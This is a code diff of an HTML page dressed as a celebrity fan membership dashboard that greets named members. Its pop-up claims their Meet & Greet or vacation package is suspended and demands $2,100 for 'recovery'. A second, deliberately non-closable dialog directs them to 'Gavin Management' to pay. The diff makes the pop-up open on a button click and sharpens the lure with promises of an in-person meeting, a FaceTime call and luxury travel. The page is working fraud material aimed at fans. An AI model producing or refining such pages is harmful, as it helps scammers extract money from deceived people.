@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Meet & Greet Membership Dashboard</title>
+  <title>Membership Card 2026 Dashboard</title>
   <style>
     body {
       font-family: 'Arial', sans-serif;
@@ -86,13 +86,13 @@
       background-color: #ffb84d;
     }
     .popup-modal {
+      display: none;
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
       background-color: rgba(0, 0, 0, 0.88);
-      display: flex;
       justify-content: center;
       align-items: center;
       z-index: 1000;
@@ -131,29 +131,32 @@
     <!-- Celebrity Profile -->
     <div class="profile">
       <img src="./assets1/celel.jpg" alt="Celebrity Image">
-      <h2>Meet & Greet Membership</h2>
+      <h2>Membership Card 2026</h2>
     </div>
-    <h1>Welcome, Bridget Peterson!</h1>
+    <h1>Welcome, Seairra Williams!</h1>
     
     <!-- Membership Card -->
     <div class="membership-card">
-      <img src="./assets1/fan_profile1.jpg" alt="Fan Image" class="fan-image">
+      <img src="./assets1/fan_profile3.jpg" alt="Fan Image" class="fan-image">
       <h3>Your Membership Card</h3>
-      <p>Member: Bridget Peterson</p>
-      <p>Membership ID: #111</p>
+      <p>Member: Seairra Williams</p>
+      <p>Membership ID: #113</p>
       <p>Status: Active</p>
     </div>
+
+    <!-- View Details Button -->
+    <button class="open-button" onclick="openPopup()">View Details</button>
   </div>
 
-  <!-- Always-visible Modal -->
+  <!-- Popup Modal -->
   <div class="popup-modal" id="recoveryModal">
     <div class="popup-content" id="modalContent">
-      <!-- Initial content (will be replaced on button click) -->
-      <h2>Recovery of Membership Card 2026</h2>
+      <!-- Step 1: Recovery prompt -->
+      <h2>Recovery of Vacation Meet & Greet 2026</h2>
       <p class="recover-info">
-        Your premium membership access has been temporarily suspended.<br>
-        To restore full privileges and continue enjoying exclusive benefits,
-        please complete the membership card recovery process.
+        Your exclusive Vacation Meet & Greet package for 2026 is currently on hold.<br><br>
+        To reactivate your confirmed in-person meeting, private FaceTime call, and luxury vacation arrangements,
+        please complete the required recovery step below.
       </p>
       <div class="important-text">
         Recover with <strong>$2,100</strong>
@@ -163,25 +166,23 @@
   </div>
 
   <script>
-    // Show second step (non-closable message)
+    function openPopup() {
+      document.getElementById('recoveryModal').style.display = 'flex';
+    }
+
     function showRecoveryStep2() {
       const content = document.getElementById('modalContent');
       content.innerHTML = `
         <h2>Next Step</h2>
         <p class="recover-info" style="font-size: 18px; line-height: 1.6;">
-          Thank you for initiating recovery.<br><br>
-          Please contact <strong>Gavin Management</strong> directly to complete<br>
-          the verification and payment process securely.<br><br>
-          This is the final step to reactivate your premium access.
+          Recovery process started.<br><br>
+          Please contact <strong>Gavin Management</strong> directly to finalize verification<br>
+          and securely complete the payment.<br><br>
+          This is the last step to unlock your 2026 Vacation Meet & Greet experience.
         </p>
-        <!-- No close button - dialog stays open -->
+        <!-- No close button – remains non-closable -->
       `;
     }
-
-    // Modal shows automatically on page load
-    window.onload = function() {
-      document.getElementById('recoveryModal').style.display = 'flex';
-    };
   </script>
 </body>
 </html>
